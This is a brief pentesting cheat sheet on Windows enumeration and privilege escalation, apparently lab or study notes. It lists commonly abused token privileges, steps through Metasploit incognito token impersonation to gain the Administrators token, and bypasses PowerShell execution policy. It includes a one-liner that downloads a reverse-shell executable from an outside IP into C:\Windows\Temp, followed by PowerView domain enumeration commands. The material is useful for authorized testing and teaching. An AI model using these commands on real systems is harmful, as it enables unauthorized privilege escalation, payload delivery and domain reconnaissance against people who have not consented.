# Windows Enumeration
---
## Windows tools
- Nishang
- Windows Exploit Suggester 
---
## View all the privileges using whoami /priv
- The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

	- SeImpersonatePrivilege
	- SeAssignPrimaryPrivilege
	- SeTcbPrivilege
	- SeBackupPrivilege
	- SeRestorePrivilege
	- SeCreateTokenPrivilege
	- SeLoadDriverPrivilege
	- SeTakeOwnershipPrivilege
	- SeDebugPrivilege

- You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

- To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token.

## Invoke PS from CMD and bypass ep
- powershell -ep bypass

## Powershell Wget Equivalent 
powershell -c "Invoke-WebRequest -Uri 'http://10.13.44.60/shell-x86.exe' -OutFile 'c:\Windows\Temp\shell.exe'"


## Powerview.ps1
. .\PowerView.ps1
Get-NetComputer -fulldata | select operatingsystem - gets a list of all operating systems on the domain
Get-NetUser | select cn - gets a list of all users on the domain
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 - powerview cheat sheet
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview - powerview cheat sheet